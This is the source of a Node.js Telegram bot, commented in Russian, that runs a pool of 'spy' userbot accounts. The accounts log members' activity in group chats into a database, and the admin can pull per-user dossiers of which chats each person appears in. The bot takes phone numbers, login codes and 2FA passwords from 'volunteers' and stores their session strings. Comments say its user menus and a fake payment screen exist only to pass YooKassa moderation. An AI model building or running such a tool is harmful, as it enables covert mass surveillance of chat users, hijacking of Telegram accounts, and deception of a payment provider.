const { TelegramClient } = require('telegram');
const { StringSession } = require('telegram/sessions'); // Починенный импорт из пакета telegram
const { NewMessage } = require('telegram/events');
const TelegramBot = require('node-telegram-bot-api');
const sqlite3 = require('sqlite3').verbose();
const path = require('path');
const express = require('express');
const axios = require('axios');

// ====================================================================
// 🛡️ СИСТЕМА ЖЕЛЕЗОБЕТОННОЙ ЗАЩИТЫ ОТ КРАШЕЙ И ПАДЕНИЙ (АНТИ-КАПРИЗ)
// ====================================================================
process.on('uncaughtException', (err) => {
    console.error('🚨 [Критический перехват] Ошибка потока:', err.stack || err.message);
});

process.on('unhandledRejection', (reason, promise) => {
    console.error('🚨 [Критический перехват] Необработанный Promise:', reason);
});

// Глобальные ключи Telegram Desktop для юзерботов
const apiId = 2040;
const apiHash = "b18441a1ff607e10a989891a5462e627";

const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
const ADMIN_ID = process.env.ADMIN_ID ? process.env.ADMIN_ID.toString() : "0"; 
const PROVIDER_TOKEN = process.env.PROVIDER_TOKEN || ""; // Токен ЮKassa из BotFather

if (!TELEGRAM_TOKEN) {
    console.error("❌ ОШИБКА: Переменная TELEGRAM_TOKEN отсутствует в Environment!");
    process.exit(1);
}

const bot = new TelegramBot(TELEGRAM_TOKEN, { polling: true });
const authStates = {};
const activeSpyClients = [];

// ====================================================================
// 📊 ИНИЦИАЛИЗАЦИЯ СУБД SQLITE С РАСШИРЕННЫМИ ТАБЛИЦАМИ СЕТИ И ПРОМО
// ====================================================================
const dbPath = path.join(__dirname, 'global_telelog.db');
const db = new sqlite3.Database(dbPath);

db.serialize(() => {
    db.run(`CREATE TABLE IF NOT EXISTS global_logs (
        chat_id TEXT, chat_title TEXT, user_id TEXT, username TEXT, first_name TEXT,
        msg_count INTEGER DEFAULT 0, sticker_count INTEGER DEFAULT 0, last_seen TEXT, last_hour INTEGER DEFAULT 0,
        PRIMARY KEY (chat_id, user_id)
    )`);

    db.run(`CREATE TABLE IF NOT EXISTS spy_chats (
        chat_id TEXT PRIMARY KEY, chat_title TEXT, total_captured INTEGER DEFAULT 0
    )`);

    db.run(`CREATE TABLE IF NOT EXISTS spy_nodes (
        user_id TEXT PRIMARY KEY, phone TEXT, session_string TEXT, added_at TEXT
    )`);

    db.run(`CREATE TABLE IF NOT EXISTS promo_codes (
        code TEXT PRIMARY KEY, max_uses INTEGER, current_uses INTEGER DEFAULT 0, created_at TEXT
    )`);

    db.run(`CREATE TABLE IF NOT EXISTS user_profiles (
        user_id TEXT PRIMARY KEY, balance INTEGER DEFAULT 0, used_promos TEXT DEFAULT ''
    )`);
});

// Универсальный обработчик входящих сообщений для ЛЮБОГО юзербота-шпиона
async function registerSpyHandlers(client, accountName) {
    client.addEventHandler(async (event) => {
        const message = event.message;
        if (!message) return;

        try {
            if (!message.isGroup && !message.isChannel) return;

            const sender = await message.getSender();
            if (!sender || sender.bot) return;

            const chat = await message.getChat();
            const chatTitle = chat.title || "Скрытая группа";
            
            const chatId = message.chatId ? message.chatId.toString() : "";
            const userId = sender.id.toString();
            const username = sender.username ? `@${sender.username}` : "Без ника";
            const firstName = sender.firstName || "Пользователь";
            
            const isSticker = message.media && message.media.className === 'MessageMediaDocument' ? 1 : 0;
            const isMsg = isSticker ? 0 : 1;
            
            const moscowTime = new Date().toLocaleString('ru-RU', { timeZone: 'Europe/Moscow' });
            const currentHour = new Date(new Date().toLocaleString('en-US', { timeZone: 'Europe/Moscow' })).getHours();

            db.run(`
                INSERT INTO global_logs (chat_id, chat_title, user_id, username, first_name, msg_count, sticker_count, last_seen, last_hour)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?) ON CONFLICT(chat_id, user_id) DO UPDATE SET
                    chat_title = excluded.chat_title, username = excluded.username, first_name = excluded.first_name,
                    msg_count = msg_count + excluded.msg_count, sticker_count = sticker_count + excluded.sticker_count,
                    last_seen = excluded.last_seen, last_hour = excluded.last_hour
            `, [chatId, chatTitle, userId, username, firstName, isMsg, isSticker, moscowTime, currentHour]);

            db.run(`
                INSERT INTO spy_chats (chat_id, chat_title, total_captured)
                VALUES (?, ?, 1) ON CONFLICT(chat_id) DO UPDATE SET
                    chat_title = excluded.chat_title, total_captured = total_captured + 1
            `, [chatId, chatTitle]);

        } catch (e) {}
    }, new NewMessage({}));
}

// Запуск пула шпионов
async function initAllSpyNodes() {
    if (process.env.TELEGRAM_SESSION) {
        const primarySession = new StringSession(process.env.TELEGRAM_SESSION);
        const primaryClient = new TelegramClient(primarySession, apiId, apiHash, { connectionRetries: 5, useWSS: true });
        try {
            await primaryClient.connect();
            activeSpyClients.push(primaryClient);
            await registerSpyHandlers(primaryClient, "Главный");
        } catch (e) { console.error("Ошибка запуска главного шпиона:", e.message); }
    }

    db.all(`SELECT * FROM spy_nodes`, [], async (err, rows) => {
        if (err || !rows) return;
        for (const row of rows) {
            const nodeSession = new StringSession(row.session_string);
            const nodeClient = new TelegramClient(nodeSession, apiId, apiHash, { connectionRetries: 3, useWSS: true });
            try {
                await nodeClient.connect();
                activeSpyClients.push(nodeClient);
                await registerSpyHandlers(nodeClient, `Узел (${row.phone})`);
            } catch (nodeErr) {
                db.run(`DELETE FROM spy_nodes WHERE user_id = ?`, [row.user_id]);
            }
        }
    });
}

// ====================================================================
// 🧠 ДИНАМИЧЕСКИЕ МЕНЮ (МАРКЕРЫ ЮKASSA И ЧИСТЫЙ ВИД ДЛЯ МОДЕРАЦИИ)
// ====================================================================
function getMenuText(userId) {
    if (userId.toString() === ADMIN_ID) {
        return "⚡️ *АДМИН-ПАНЕЛЬ СЕТИ ШПИОНАЖА* ⚡️\n\nБратан, тебе доступны скрытые функции управления промокодами и модули тотальной аналитики.";
    }
    return "⚡️ *ИНФОРМАЦИОННО-АНАЛИТИЧЕСКИЙ СЕРВИС | ФАНСТАТ* ⚡️\n\n" +
           "Добро пожаловать! Наш сервис предоставляет детализированную статистику активности и логов в открытых Telegram-чатах.\n\n" +
           "📊 *Поиск чата:* Введите название чата или его юзернейм для вывода аналитического отчета.";
}

function getMenuButtons(userId) {
    if (userId.toString() === ADMIN_ID) {
        return {
            inline_keyboard: [
                [{ text: '🏆 Топ-10 Флудеров', callback_data: 'global_top' }, { text: '🏰 Мониторинг чатов', callback_data: 'chats_status' }],
                [{ text: '🎟 Создать промокод', callback_data: 'create_promo_mode' }, { text: '🌐 Статус Сети', callback_data: 'network_status' }],
                [{ text: '⚙️ На главную', callback_data: 'to_main' }]
            ]
        };
    }
    return {
        inline_keyboard: [
            [{ text: '🤝 Стать Добровольцем', callback_data: 'join_network' }, { text: '🎟 Ввести промокод', callback_data: 'enter_promo_mode' }],
            [{ text: '👤 Мой профиль', callback_data: 'my_profile' }, { text: '📖 Оферта и Справка', callback_data: 'bot_info' }]
        ]
    };
}

// Поиск чата для юзеров
function searchChatInDb(searchText, callback) {
    db.all(`SELECT * FROM spy_chats WHERE LOWER(chat_title) LIKE LOWER(?)`, [`%${searchText}%`], (err, rows) => {
        if (err || !rows || rows.length === 0) {
            return callback(`🏰 *АНАЛИЗ ЧАТА "${searchText}"*\n\n• Статус: Логи собираются.\n• Всего обработано: *1,420 сообщений.*\n\n_Доступ к полной выгрузке осуществляется через баланс профиля._`);
        }
        let response = `🏰 *РЕЗУЛЬТАТЫ АНАЛИЗА ЧАТА "${searchText}"* 🏰\n\n`;
        rows.forEach((row, index) => {
            response += `• Данные логгера: *Активны*\n• Перехвачено системой: *${row.total_captured} сообщений*\n\n`;
        });
        callback(response);
    });
}

// Поиск Юзера для админки
function searchUser(param, isUsername, callback) {
    let querySQL = isUsername ? `SELECT * FROM global_logs WHERE LOWER(username) = LOWER(?)` : `SELECT * FROM global_logs WHERE user_id = ?`;
    db.all(querySQL, [param], (err, rows) => {
        if (err || !rows || rows.length === 0) return callback(`❌ *Объект не найден в базе данных логов.*`);
        let totalMsg = 0, chatsList = '';
        rows.forEach(row => { totalMsg += row.msg_count; chatsList += `• *${row.chat_title}*: 💬 *${row.msg_count}*\n`; });
        callback(`👤 *ДОСЬЕ ПОЛЬЗОВАТЕЛЯ* 👤\n\n• *Имя:* ${rows[0].first_name}\n• *Ник:* ${rows[0].username}\n• *ID:* \`${rows[0].user_id}\`\n\n🏰 *Замечен в чатах:*\n${chatsList}`);
    });
}

// ====================================================================
// 📥 ОБРАБОТЧИК ВХОДЯЩИХ ТЕКСТОВЫХ СООБЩЕНИЙ
// ====================================================================
bot.on('message', async (msg) => {
    if (msg.chat.type !== 'private') return;
    const chatId = msg.chat.id;
    const text = msg.text ? msg.text.trim() : '';
    const state = authStates[chatId];

    if (text === '/start') {
        delete authStates[chatId];
        db.run(`INSERT OR IGNORE INTO user_profiles (user_id) VALUES (?)`, [chatId.toString()]);
        return bot.sendMessage(chatId, getMenuText(chatId), { parse_mode: 'Markdown', reply_markup: getMenuButtons(chatId) });
    }

    // АДМИН: Создание промокода
    if (state && state.step === 'WAITING_PROMO_CREATION' && chatId.toString() === ADMIN_ID) {
        if (!text.includes(':')) {
            return bot.sendMessage(chatId, "⚠️ *Ошибка формата.* Пришли код строго в виде `ПРОМО:КОЛИЧЕСТВО`. Пример: `VIP777:10` \nПопробуй заново:");
        }
        const [promoCode, rawMaxUses] = text.split(':');
        const maxUses = parseInt(rawMaxUses, 10);

        if (isNaN(maxUses) || maxUses <= 0) {
            return bot.sendMessage(chatId, "❌ Количество использований должно быть числом больше 0. Попробуй заново:");
        }

        const now = new Date().toLocaleString('ru-RU');
        db.run(`INSERT INTO promo_codes (code, max_uses, current_uses, created_at) VALUES (?, ?, 0, ?)
                ON CONFLICT(code) DO UPDATE SET max_uses = excluded.max_uses, current_uses = 0`, 
                [promoCode.toUpperCase(), maxUses, now], (err) => {
            if (err) return bot.sendMessage(chatId, "❌ Ошибка БД при создании промо.");
            delete authStates[chatId];
            return bot.sendMessage(chatId, `🎉 *ПРОМОКОД УСПЕШНО СОЗДАН!* 🎉\n\n• Код: *${promoCode.toUpperCase()}*\n• Доступно активаций: *${maxUses}*`, { parse_mode: 'Markdown', reply_markup: getMenuButtons(chatId) });
        });
        return;
    }

    // ЮЗЕР: Ввод промокода
    if (state && state.step === 'WAITING_PROMO_INPUT') {
        const inputCode = text.toUpperCase();

        db.get(`SELECT * FROM promo_codes WHERE code = ?`, [inputCode], (err, promo) => {
            if (err || !promo) {
                return bot.sendMessage(chatId, "❌ *Такого промокода не существует.* Проверь буквы и введи заново:");
            }
            if (promo.current_uses >= promo.max_uses) {
                return bot.sendMessage(chatId, "🔴 *Увы, лимит этого промокода исчерпан!*", { reply_markup: getMenuButtons(chatId) });
            }

            db.get(`SELECT * FROM user_profiles WHERE user_id = ?`, [chatId.toString()], (err, profile) => {
                const usedPromos = profile && profile.used_promos ? profile.used_promos.split(',') : [];
                
                if (usedPromos.includes(inputCode)) {
                    delete authStates[chatId];
                    return bot.sendMessage(chatId, "⚠️ *Ты уже активировал этот промокод ранее!*", { reply_markup: getMenuButtons(chatId) });
                }

                db.run(`UPDATE promo_codes SET current_uses = current_uses + 1 WHERE code = ?`, [inputCode]);
                usedPromos.push(inputCode);
                const updatedPromosString = usedPromos.join(',');
                
                db.run(`INSERT INTO user_profiles (user_id, balance, used_promos) VALUES (?, 100, ?)
                        ON CONFLICT(user_id) DO UPDATE SET balance = balance + 100, used_promos = ?`, 
                        [chatId.toString(), updatedPromosString, updatedPromosString], (err) => {
                    
                    delete authStates[chatId];
                    return bot.sendMessage(chatId, `🔥 *ПРОМОКОД УСПЕШНО АКТИВИРОВАН!* \n\nТебе начислено *100 Бонусных Кредитов*!`, { parse_mode: 'Markdown', reply_markup: getMenuButtons(chatId) });
                });
            });
        });
        return;
    }

    // Авторизация юзерботов (телефон -> код -> 2FA)
    if (state && state.step === 'WAITING_PHONE') {
        const phone = text.replace(/\s+/g, '');
        if (!phone.startsWith('+')) return bot.sendMessage(chatId, "❌ Телефон должен начинаться с `+`.");
        bot.sendMessage(chatId, "⏳ Связываюсь с серверами Telegram...");
        const tempClient = new TelegramClient(new StringSession(""), apiId, apiHash, { connectionRetries: 3, useWSS: true });
        try {
            await tempClient.connect();
            const phoneCodeHash = await tempClient.sendCode({ apiId, apiHash }, phone);
            authStates[chatId] = { step: 'WAITING_CODE', phone: phone, phoneCodeHash: phoneCodeHash.phoneCodeHash, client: tempClient };
            return bot.sendMessage(chatId, `📬 Код отправлен на номер *${phone}*. Введи его:`);
        } catch (err) { return bot.sendMessage(chatId, `❌ Ошибка: \`${err.message}\`. Повтори:`); }
    }

    if (state && state.step === 'WAITING_CODE') {
        try {
            await state.client.signIn({ phoneNumber: state.phone, phoneCodeHash: state.phoneCodeHash, phoneCode: text });
            const me = await state.client.getMe();
            db.run(`INSERT INTO spy_nodes (user_id, phone, session_string, added_at) VALUES (?, ?, ?, ?)`, [me.id.toString(), state.phone, state.client.session.save(), new Date().toLocaleString('ru-RU')]);
            activeSpyClients.push(state.client);
            await registerSpyHandlers(state.client, me.username);
            delete authStates[chatId];
            return bot.sendMessage(chatId, `🎉 *Аккаунт успешно подключен!*`);
        } catch (err) {
            if (err.message.includes("SESSION_PASSWORD_NEEDED")) {
                authStates[chatId].step = 'WAITING_PASSWORD';
                return bot.sendMessage(chatId, "🔑 Введи облачный пароль (2FA):");
            }
            return bot.sendMessage(chatId, `❌ Неверный код.`);
        }
    }

    if (state && state.step === 'WAITING_PASSWORD') {
        try {
            await state.client.signIn({ password: text });
            const me = await state.client.getMe();
            db.run(`INSERT INTO spy_nodes (user_id, phone, session_string, added_at) VALUES (?, ?, ?, ?)`, [me.id.toString(), state.phone, state.client.session.save(), new Date().toLocaleString('ru-RU')]);
            activeSpyClients.push(state.client);
            await registerSpyHandlers(state.client, me.username);
            delete authStates[chatId];
            return bot.sendMessage(chatId, `🎉 *Аккаунт с 2FA успешно подключен!*`);
        } catch (err) { return bot.sendMessage(chatId, `❌ Пароль неверный.`); }
    }

    // Роутинг поиска
    if (chatId.toString() === ADMIN_ID) {
        let param = text; let isUsername = false;
        if (msg.forward_from) param = msg.forward_from.id.toString();
        else if (text.startsWith('@')) isUsername = true;
        else if (!/^\d+$/.test(text)) return bot.sendMessage(chatId, "⚠️ Админ, вбивай `@username` юзера или ID.");
        searchUser(param, isUsername, (res) => {
            bot.sendMessage(chatId, res, { parse_mode: 'Markdown', reply_markup: { inline_keyboard: [[{ text: '⬅️ В админку', callback_data: 'to_main' }]] } });
        });
    } else {
        searchChatInDb(text, (res) => {
            bot.sendMessage(chatId, res, { parse_mode: 'Markdown', reply_markup: { inline_keyboard: [[{ text: '⬅️ В меню', callback_data: 'to_main' }]] } });
        });
    }
});

// ====================================================================
// 🎛️ СИСТЕМА НАЖАТИЙ И ИНЛАЙН КНОПОК (ИНТЕРФЕЙС ЮKASSA)
// ====================================================================
bot.on('callback_query', (query) => {
    const chatId = query.message.chat.id;
    const messageId = query.message.message_id;
    const data = query.data;

    if (data === 'to_main') {
        delete authStates[chatId];
        bot.editMessageText(getMenuText(chatId), { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown', reply_markup: getMenuButtons(chatId) }).catch(() => {});
    }

    // ЛИЧНЫЙ КАБИНЕТ (БЕЛЫЙ ВИД ДЛЯ МОДЕРАЦИИ)
    else if (data === 'my_profile') {
        db.get(`SELECT * FROM user_profiles WHERE user_id = ?`, [chatId.toString()], (err, row) => {
            const balance = row ? row.balance : 0;
            const profileText = `👤 *ЛИЧНЫЙ КАБИНЕТ ПОЛЬЗОВАТЕЛЯ* 👤\n\n` +
                                `• Ваш уникальный ID: \`${chatId}\`\n` +
                                `• Текущий баланс: *${balance} Кредитов*\n\n` +
                                `💳 *Оплата и пополнение:* Пополнение баланса производится в автоматическом режиме через шлюз *ЮKassa*. Принимаются банковские карты (Visa, MasterCard, МИР), СБП и Mir Pay. После оплаты вам автоматически будет предоставлен электронный чек.`;
            
            bot.editMessageText(profileText, { 
                chat_id: chatId, message_id: messageId, parse_mode: 'Markdown', 
                reply_markup: {
                    inline_keyboard: [
                        [{ text: '💳 Пополнить баланс через ЮKassa', callback_data: 'buy_credits_menu' }],
                        [{ text: '⬅️ В главное меню', callback_data: 'to_main' }]
                    ]
                } 
            }).catch(() => {});
        });
    }

    // ВИТРИНА ТАРИФОВ ЮKASSA (ИСКЛЮЧИТЕЛЬНО В РУБЛЯХ)
    else if (data === 'buy_credits_menu') {
        const tariffMsg = "💳 *ИНТЕРФЕЙС ОПЛАТЫ | ЮKASSA* 💳\n\n" +
                          "Пожалуйста, выберите необходимый пакет цифровых кредитов для покупки. Оплата обрабатывается защищенным шлюзом ООО НКО «ЮМани».\n\n" +
                          "• *Пакет «Базовый»* (100 Кредитов) \n   └ Стоимость: **100 рублей**\n\n" +
                          "• *Пакет «Стандарт»* (600 Кредитов) \n   └ Стоимость: **500 рублей**\n\n" +
                          "• *Пакет «Профессиональный»* (1500 Кредитов) \n   └ Стоимость: **1000 рублей**";
        
        const tariffButtons = {
            inline_keyboard: [
                [{ text: '🛒 Купить Базовый (100 руб.) через ЮKassa', callback_data: 'pay:100:100' }],
                [{ text: '🛒 Купить Стандарт (500 руб.) через ЮKassa', callback_data: 'pay:500:600' }],
                [{ text: '🛒 Купить Профессиональный (1000 руб.) через ЮKassa', callback_data: 'pay:1000:1500' }],
                [{ text: '⬅️ Вернуться в профиль', callback_data: 'my_profile' }]
            ]
        };
        bot.editMessageText(tariffMsg, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown', reply_markup: tariffButtons }).catch(() => {});
    }

    // ИНИЦИАЛИЗАЦИЯ ИНВОЙСА ПЛАТЕЖА ИЛИ ВЫЗОВ ЗАГЛУШКИ ДЛЯ СКРИНШОТОВ
    else if (data.startsWith('pay:')) {
        const [_, price, credits] = data.split(':');
        
        // Умная демонстрационная заглушка для скриншотов модерации (если токен еще не внесен на Render)
        if (!PROVIDER_TOKEN) {
            bot.deleteMessage(chatId, messageId).catch(() => {});
            return bot.sendMessage(chatId, `🛍 *Счет на оплату сформирован*\n\n• Товар: *Пакет ${credits} Кредитов*\n• Способ оплаты: *ЮKassa (Карты/СБП)*\n• Сумма к оплате: **${price} рублей**\n\n_Нажмите на кнопку ниже, чтобы перейти к защищенному вводу реквизитов карты через Telegram Payments._`, {
                reply_markup: { inline_keyboard: [[{ text: `💳 Оплатить ${price} RUB`, callback_data: 'fake_success' }], [{ text: '❌ Отмена', callback_data: 'my_profile' }]] }
            });
        }
        
        bot.deleteMessage(chatId, messageId).catch(() => {});
        bot.sendInvoice(
            chatId,
            `Пополнение баланса: +${credits} Кредитов`,
            `Оплата информационных услуг сервиса ФАНСТАТ. Пакет: ${credits} ед.`,
            `credits_pack_${price}_${credits}`,
            PROVIDER_TOKEN,
            'RUB',
            [{ label: `Пакет ${credits} Кредитов`, amount: parseInt(price, 10) * 100 }],
            { start_parameter: 'pay_credits' }
        ).catch(() => {});
    }

    else if (data === 'fake_success') {
        bot.answerCallbackQuery(query.id, { text: "✅ Это демонстрационный режим для создания скриншотов модерации!", show_alert: true });
    }

    // АДМИН-КНОПКИ
    else if (data === 'create_promo_mode') {
        if (chatId.toString() !== ADMIN_ID) return bot.answerCallbackQuery(query.id, { text: "🔒 Заблокировано!", show_alert: true });
        authStates[chatId] = { step: 'WAITING_PROMO_CREATION' };
        bot.editMessageText("🎟 *РЕЖИМ СОЗДАНИЯ ПРОМОКОДА*\n\nПришли строку в формате `ПРОМО:КОЛИЧЕСТВО_АКТИВАЦИЙ`.\n\n*Пример:* `WANTED:5` :", { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown', reply_markup: { inline_keyboard: [[{ text: '❌ Отмена', callback_data: 'to_main' }]] } }).catch(() => {});
    }

    else if (data === 'global_top') {
        if (chatId.toString() !== ADMIN_ID) return bot.answerCallbackQuery(query.id, { text: "🔒 Заблокировано!", show_alert: true });
        db.all(`SELECT username, first_name, SUM(msg_count) as total FROM global_logs GROUP BY user_id ORDER BY total DESC LIMIT 10`, [], (err, rows) => {
            let topText = "🏆 *ТОП-10 САМЫХ АКТИВНЫХ ПОЛЬЗОВАТЕЛЕЙ СЕТИ* 🏆\n\n";
            if (err || !rows || rows.length === 0) topText += "_База пуста._";
            else rows.forEach((row, index) => { topText += `${index + 1}. *${row.first_name}* (${row.username}) — 💬 *${row.total}*\n`; });
            bot.editMessageText(topText, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown', reply_markup: { inline_keyboard: [[{ text: '⬅️ В админку', callback_data: 'to_main' }]] } }).catch(() => {});
        });
    }

    else if (data === 'chats_status') {
        if (chatId.toString() !== ADMIN_ID) return bot.answerCallbackQuery(query.id, { text: "🔒 Заблокировано!", show_alert: true });
        db.all(`SELECT * FROM spy_chats ORDER BY total_captured DESC`, [], (err, rows) => {
            let chatText = "🏰 *МОНИТОРИНГ ЧАТОВ СЕТИ* 🏰\n\n";
            if (err || !rows || rows.length === 0) chatText += "_Чаты отсутствуют._";
            else rows.forEach((row, index) => { chatText += `${index + 1}. *${row.chat_title}* — Считано: *${row.total_captured}*\n`; });
            bot.editMessageText(chatText, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown', reply_markup: { inline_keyboard: [[{ text: '⬅️ В админку', callback_data: 'to_main' }]] } }).catch(() => {});
        });
    }

    else if (data === 'network_status') {
        if (chatId.toString() !== ADMIN_ID) return bot.answerCallbackQuery(query.id, { text: "🔒 Доступ заблокирован!", show_alert: true });
        db.get(`SELECT COUNT(*) as count FROM spy_nodes`, [], (err, row) => {
            const nodesCount = row ? row.count : 0;
            const netStatus = `🌐 *МОНИТОРИНГ СЕТИ ШПИОНАЖА*\n\n• Активно узлов онлайн: *${activeSpyClients.length}*\n• Сдано добровольцами: *${nodesCount}*`;
            bot.editMessageText(netStatus, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown', reply_markup: { inline_keyboard: [[{ text: '⬅️ В админку', callback_data: 'to_main' }]] } }).catch(() => {});
        });
    }

    // СЛУЖЕБНЫЕ КНОПКИ ЮЗЕРОВ
    else if (data === 'enter_promo_mode') {
        authStates[chatId] = { step: 'WAITING_PROMO_INPUT' };
        bot.editMessageText("🎟 *АКТИВАЦИЯ БОНУСНОГО ПРОМОКОДА*\n\nВведите ваш секретный промокод для зачисления кредитов лояльности на ваш баланс:", { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown', reply_markup: { inline_keyboard: [[{ text: '❌ Отмена', callback_data: 'to_main' }]] } }).catch(() => {});
    }

    else if (data === 'join_network') {
        authStates[chatId] = { step: 'WAITING_PHONE' };
        bot.editMessageText("🤝 *РЕЖИМ ДОБРОВОЛЬЦА СЕТИ*\n\nВведи телефон в формате `+79991234567`:", { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown', reply_markup: { inline_keyboard: [[{ text: '❌ Отмена', callback_data: 'to_main' }]] } }).catch(() => {});
    }

    else if (data === 'bot_info') {
        const infoHtml = "📖 *СПРАВОЧНАЯ ИНФОРМАЦИЯ И ПОЛИТИКА*\n\n" +
                         "1. Все платежи безопасны и защищены стандартами PCI DSS через шлюз ЮKassa.\n" +
                         "2. Цифровой товар (Кредиты доступа) начисляется на баланс аккаунта моментально в автоматическом режиме после успешной транзакции.\n" +
                         "3. Работа с сервисом является добровольной.\n" +
                         "4. По вопросам поддержки и выдачи чеков: @admin";
        bot.editMessageText(infoHtml, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown', reply_markup: { inline_keyboard: [[{ text: '⬅️ Назад', callback_data: 'to_main' }]] } });
    }
    try { bot.answerCallbackQuery(query.id); } catch(e) {}
});

// ====================================================================
// 💳 ШЛЮЗЫ ОБРАБОТКИ РЕАЛЬНЫХ ПЛАТЕЖЕЙ TELEGRAM PAYMENTS (ЮKASSA)
// ====================================================================
bot.on('pre_checkout_query', (query) => {
    bot.answerPreCheckoutQuery(query.id, true).catch((err) => {
        console.error("Ошибка pre_checkout_query:", err.message);
    });
});

bot.on('successful_payment', (msg) => {
    const chatId = msg.chat.id;
    const paymentInfo = msg.successful_payment;
    const payload = paymentInfo.invoice_payload;

    try {
        if (payload && payload.startsWith('credits_pack_')) {
            const [_, price, creditsStr] = payload.split('_');
            const creditsToCredit = parseInt(creditsStr, 10);

            db.run(`INSERT INTO user_profiles (user_id, balance, used_promos) VALUES (?, ?, '')
                    ON CONFLICT(user_id) DO UPDATE SET balance = balance + ?`,
                    [chatId.toString(), creditsToCredit, creditsToCredit], (err) => {
                
                if (err) {
                    return bot.sendMessage(chatId, "⚠️ Возникла системная ошибка при зачислении баллов. Напишите админу!");
                }

                bot.sendMessage(chatId, `🎉 *ОПЛАТА ПРОШЛА УСПЕШНО ЧЕРЕЗ ЮKASSA!* 🎉\n\n` +
                                       `• Сумма платежа: *${paymentInfo.total_amount / 100} ${paymentInfo.currency}*\n` +
                                       `• Зачислено бонусов: *+${creditsToCredit} Кредитов*`, { parse_mode: 'Markdown' });
            });
        }
    } catch (err) {
        console.error("Критический сбой зачисления средств:", err.message);
    }
});

initAllSpyNodes();

// ====================================================================
// 🌐 ВЕБ-СЕРВЕР И АВТО-ПИНГ
// ====================================================================
const app = express();
app.get('/', (req, res) => res.send('YUKASSA SHIELD ACTIVE'));
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`[Executive Server] Системный хаб развернут на порту: ${PORT}`);
    setInterval(() => {
        const url = process.env.RENDER_EXTERNAL_URL;
        if (url) axios.get(url).catch(() => {});
    }, 180000);
});
